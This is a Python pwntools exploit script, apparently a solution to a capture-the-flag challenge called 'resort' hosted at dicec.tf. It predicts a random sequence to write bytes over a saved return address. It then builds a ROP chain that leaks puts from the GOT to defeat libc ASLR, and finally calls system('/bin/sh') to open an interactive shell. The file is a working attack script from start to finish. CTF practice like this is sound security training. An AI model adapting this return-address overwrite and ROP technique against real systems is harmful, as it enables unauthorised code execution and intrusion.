#!/usr/bin/env python3

from pwn import *
import subprocess

exe = ELF("./resort")
libc = ELF("./libc.so.6")
# libc = ELF("/lib/libc.so.6")

context.binary = exe
# context.log_level = 'debug'

class RandOracle:
    def __init__(self):
        self.proc = subprocess.Popen(["./randoracle"], stdout=subprocess.PIPE)
    
    def next(self):
        return int(self.proc.stdout.readline().rstrip())

def main():
    r = remote("dicec.tf", 32030)
    # r = remote("localhost", 5000)
    # r = process("../resort")
    # gdb.attach(r)
    r.recvuntil(b"r2uwu2 @ 0x")
    exe.address = int(r.recvuntil(" ").decode(), 16) - exe.sym.print_ui

    # good luck pwning :)

    ro = RandOracle()

    def write_byte_at_ret(off: int, b: int):
        # zero byte
        r.recvuntil(b"> ")
        num_tries = 0
        while True:
            num_tries += 1
            expected = ro.next()
            if expected == -1: break
        r.send((str(ret_offset + off) + "\n").encode() * num_tries)

        for _ in range(num_tries - 1):
            r.recvuntil(b"> ")

        # write byte
        if b != 0:
            r.recvuntil(b"> ")
            num_tries = 0
            while True:
                expected = ro.next()
                if expected != -1 and (256 - expected) == b: break
                num_tries += 1
            
            r.send(b"1\n" * num_tries + str(ret_offset + off).encode() + b"\n")

            for _ in range(num_tries - 1):
                r.recvuntil(b"> ")
    
    # bunnies[1] is at $rsp + 0xf
    # return address is at $rsp + 0x48 + 7 pushes
    ret_offset = 0x48-0xf+7*8-4

    # step 1: leak libc
    rop1 = ROP(exe)
    print(rop1.gadgets)
    rop1.puts(exe.got.puts)
    rop1.rdi = 0xeaafaaa # sse2 dies if we don't align the stack
    rop1.rbp = 0xeaafaaa
    rop1.main()
    log.info(rop1.dump())
    rop1_chain = rop1.chain()

    # write ropchain
    for i, rop1_byte in enumerate(rop1_chain):
        log.info(f"writing rop1 {i}")
        write_byte_at_ret(i, rop1_byte)

    # actually win (the scanf code has a bug and i'm too evil to fix it)
    def murder_bunny(i, p):
        print(f"murdering bunny {i}")
        while True:
            promp = r.recvpred(lambda x: b" > " in x or b"wins!\n" in x)
            if b"wins!" in promp: return
            ro.next()
            if (p + b"{ xx }" + p) in promp:
                r.sendline(b"5")
                return
            r.sendline(str(i).encode())

    murder_bunny(1, b'*')
    murder_bunny(2, b"'")
    murder_bunny(3, b'.')

    libc.address = u64(r.recvline().strip().ljust(8, b'\x00')) - libc.sym.puts
    
    # step 2: shell
    rop2 = ROP(exe)
    rop2.r15 = 0xeaafaaa # sse2 dies if we don't align the stack
    rop3 = ROP([libc, exe])
    rop3.system(next(libc.search(b"/bin/sh")))
    log.info(rop2.dump())
    log.info(rop3.dump())
    rop2_chain = rop2.chain() + rop3.chain()
    
    # write ropchain
    for i, rop2_byte in enumerate(rop2_chain):
        log.info(f"writing rop2 {i}")
        write_byte_at_ret(i, rop2_byte)

    r.sendline(b"a")

    r.interactive()


if __name__ == "__main__":
    main()
